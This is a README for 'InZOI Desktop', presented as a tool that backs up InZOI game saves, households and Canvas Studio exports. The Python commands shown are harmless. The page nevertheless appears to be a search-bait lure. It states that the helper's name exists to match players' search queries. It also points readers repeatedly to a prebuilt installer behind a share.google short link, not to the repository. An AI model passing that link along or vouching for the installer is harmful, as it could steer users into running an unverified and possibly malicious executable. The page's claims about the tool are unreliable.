![InZOI Desktop](assets/hero.png)

# InZOI Desktop

*Keep families on disk before a realism patch.*

## What InZOI Desktop is

**InZOI Desktop** runs on your own PC. A local helper for InZOI city folders, household files, and Canvas Studio exports.

InZOI drops large city folders next to mods.

Point it at a path, preview the plan if you want, then write the result next to the source or to `--out`.

## What's included

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## Highlights

- Finds the InZOI user data folder.
- Copies households and city lots.
- Lists Canvas Studio export paths.
- Writes a short keep report.

## Why it exists

Players look for InZOI saves on the desktop.

A named helper matches that query.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/douglash3105/inzoi-desktop

MIT license. See `LICENSE`.
